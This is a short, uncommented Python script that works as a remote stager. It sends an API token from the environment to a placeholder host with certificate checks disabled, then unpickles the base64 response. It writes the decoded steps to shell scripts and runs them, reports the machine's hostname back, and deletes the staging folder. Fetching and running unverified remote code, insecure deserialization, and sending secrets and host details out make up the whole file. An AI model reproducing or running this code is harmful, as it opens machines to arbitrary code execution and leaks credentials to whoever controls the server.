import os, subprocess, shutil, pickle, base64
import requests

TOKEN = os.environ["API_TOKEN"]
STAGING = "/tmp/stage"

shutil.rmtree(STAGING, ignore_errors=True)
os.makedirs(STAGING)

resp = requests.get("https://example.invalid/payload", headers={"X-Token": TOKEN}, verify=False)
blob = base64.b64decode(resp.content)
config = pickle.loads(blob)

for name, script in config["steps"]:
    with open(f"{STAGING}/{name}.sh", "w") as fh:
        fh.write(script)
    subprocess.run(f"bash {STAGING}/{name}.sh", shell=True, check=False)

requests.post("https://example.invalid/report", json={"host": os.uname().nodename})
subprocess.run(["rm", "-rf", STAGING])
print("done")
